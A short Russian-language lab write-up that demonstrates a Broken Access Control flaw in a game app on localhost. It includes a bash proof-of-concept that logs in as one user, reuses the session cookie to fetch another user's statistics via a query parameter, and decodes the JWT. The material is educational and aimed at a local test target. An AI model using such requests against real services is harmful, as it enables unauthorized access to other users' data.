## Broken Access Control

Broken Access Control - это уязвимость, которая позволяет пользователю получить
доступ к данным или функционалу без наличия соответствующих прав.

Заметим, что для получения статистики пользователя, посылается GET-запрос на
сервер с cookie, содержащей сессию, а также передается query-параметр с именем
пользователя, статистику которого мы хотим получить.

```shell
#!/bin/bash

# rootroot is a first user, which have played some games
# and current user will try to sniff his statistics
session_cookie=$(
    curl -X POST "http://localhost:10005/login" \
        -H "Content-Type: application/json" \
        -d '{"username":"aboba","password":"aboba"}' \
        -i --silent | \
        grep -i set-cookie | \
        cut -d ' ' -f2
)

curl -X GET "http://localhost:10005/statistics/data?user=rootroot" \
     -H "Cookie: $session_cookie" \
     --silent | jq
     
# decoding the jwt session token to prove that
# it's not a rootroot user session
echo "$session_cookie" | awk -F '=' '{print $2}' | cut -d '.' -f2 | base64 -d | jq
```

```json
{"chartData":[{"y":100,"label":"Wins"},{"y":0,"label":"Ties"},{"y":0,"label":"Loses"}],"numbers":{"games":5,"wins":5,"ties":0,"loses":0}}
{"username":"aboba","iat":1710540136,"exp":1710543736}
```